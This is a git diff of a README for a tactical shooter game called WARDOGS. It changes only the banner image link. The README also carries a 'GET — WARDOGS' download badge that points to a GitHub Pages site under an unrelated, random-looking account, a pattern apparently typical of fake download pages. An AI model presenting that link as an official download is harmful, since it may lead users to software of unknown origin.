@@ -1,6 +1,6 @@
 # WARDOGS — Tactical FPS, Team Warfare & Destructible Battlefields
 
-![Banner Placeholder](https://static0.polygonimages.com/wordpress/wp-content/uploads/sharedimages/2026/08/wardogs-tag-page-cover-art.jpg)
+![Banner Placeholder](https://www.xtrafondos.com/wallpapers/wardogs-logo-presentacion-14547.jpg)
 
 [![GET — WARDOGS](https://img.shields.io/badge/GET%20%E2%80%94%20WARDOGS-0078D6?style=for-the-badge&logoColor=white)](https://e39318402.github.io/.github/WARDOGS-Tactical-FPS)
 
